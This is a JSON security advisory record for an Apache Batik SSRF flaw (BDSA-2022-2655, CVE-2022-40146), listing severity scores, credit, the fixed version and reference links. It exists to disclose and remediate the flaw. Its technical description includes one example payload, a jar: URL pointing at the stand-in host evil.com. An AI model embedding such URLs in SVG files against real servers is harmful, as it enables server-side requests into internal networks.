{
    "source": "BDSA",
    "name": "BDSA-2022-2655",
    "title": "Apache Batik Vulnerable to Server Side Request Forgery (SSRF) via 'DefaultScriptSecurity'",
    "description": "Apache Batik is vulnerable to server side request forgery (SSRF). The SSRF vulnerability affects the Batik \"bridge\" package. This vulnerability allows an attacker to craft URLs embedded in SVG files that can make requests from internal services to remote services.",
    "technicalDescription": "The SSRF vulnerability is due to the `DefaultScriptSecurity` class in `batik-bridge/src/main/java/org/apache/batik/bridge/DefaultScriptSecurity.java` not filtering or blocking URLs supplied to the `jar:` protocol. A crafted URL such as `jar:http://evil.com/poc!/` will perform a server side request.",
    "publishedDate": "2022-09-23T10:46:36.405Z",
    "updatedDate": "2022-09-23T10:46:36.395Z",
    "disclosureDate": "2022-09-22T00:00:00.000Z",
    "exploitPublishDate": "2022-09-07T00:00:00.000Z",
    "solution": "Fixed in version [**1.15**](http://svn.apache.org/viewvc/xmlgraphics/batik/tags/batik-1_15/) by [this](http://svn.apache.org/viewvc?view=revision&revision=1903910) revision.\n\nThe latest stable releases can be found [here](https://xmlgraphics.apache.org/batik/download.html).",
    "severity": "CRITICAL",
    "cvss2": {
        "baseScore": 6.4,
        "impactSubscore": 4.9,
        "exploitabilitySubscore": 10.0,
        "severity": "MEDIUM",
        "accessVector": "NETWORK",
        "accessComplexity": "LOW",
        "authentication": "NONE",
        "confidentialityImpact": "PARTIAL",
        "integrityImpact": "PARTIAL",
        "availabilityImpact": "NONE",
        "temporalMetrics": {
            "exploitability": "PROOF_OF_CONCEPT",
            "remediationLevel": "OFFICIAL_FIX",
            "reportConfidence": "CONFIRMED",
            "score": 5.0
        },
        "vector": "(AV:N/AC:L/Au:N/C:P/I:P/A:N/E:POC/RL:OF/RC:C)"
    },
    "cvss3": {
        "baseScore": 10.0,
        "impactSubscore": 5.8,
        "exploitabilitySubscore": 3.9,
        "severity": "CRITICAL",
        "attackVector": "NETWORK",
        "attackComplexity": "LOW",
        "confidentialityImpact": "HIGH",
        "integrityImpact": "HIGH",
        "availabilityImpact": "NONE",
        "privilegesRequired": "NONE",
        "scope": "CHANGED",
        "userInteraction": "NONE",
        "temporalMetrics": {
            "exploitability": "PROOF_OF_CONCEPT",
            "remediationLevel": "OFFICIAL_FIX",
            "reportConfidence": "CONFIRMED",
            "score": 9.0
        },
        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N/E:P/RL:O/RC:C"
    },
    "useCvss3": true,
    "classifications": [],
    "zeroDay": false,
    "underReview": false,
    "parentAdvisory": false,
    "credit": "Piotr Bazydlo (@chudypb) of Trend Micro Zero Day Initiative",
    "workaround": "",
    "vendorFixDate": "2022-09-07T00:00:00.000Z",
    "bdsaTags": [],
    "overallScore": 9.0,
    "_meta": {
        "allow": [
            "GET"
        ],
        "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2022-2655",
        "links": [
            {
                "rel": "cwes",
                "href": "https://trendmicro2.app.blackduck.com/api/cwes/CWE-918"
            },
            {
                "rel": "related-vulnerability",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/CVE-2022-40146",
                "label": "NVD"
            },
            {
                "rel": "bdsa-ranges",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2022-2655/ranges"
            },
            {
                "rel": "reference",
                "href": "http://svn.apache.org/viewvc/xmlgraphics/batik/tags/batik-1_15/",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "http://svn.apache.org/viewvc?view=revision&revision=1903910",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://issues.apache.org/jira/browse/BATIK-1335",
                "label": "ADVISORY"
            },
            {
                "rel": "reference",
                "href": "https://issues.apache.org/jira/browse/BATIK-1335",
                "label": "POC"
            },
            {
                "rel": "reference",
                "href": "https://lists.apache.org/thread/hxtddqjty2sbs12y97c8g7xfh17jzxsx",
                "label": "ADVISORY"
            },
            {
                "rel": "reference",
                "href": "https://xmlgraphics.apache.org/batik/download.html",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "default-remediation-status",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2022-2655/default-remediation-status"
            }
        ]
    }
}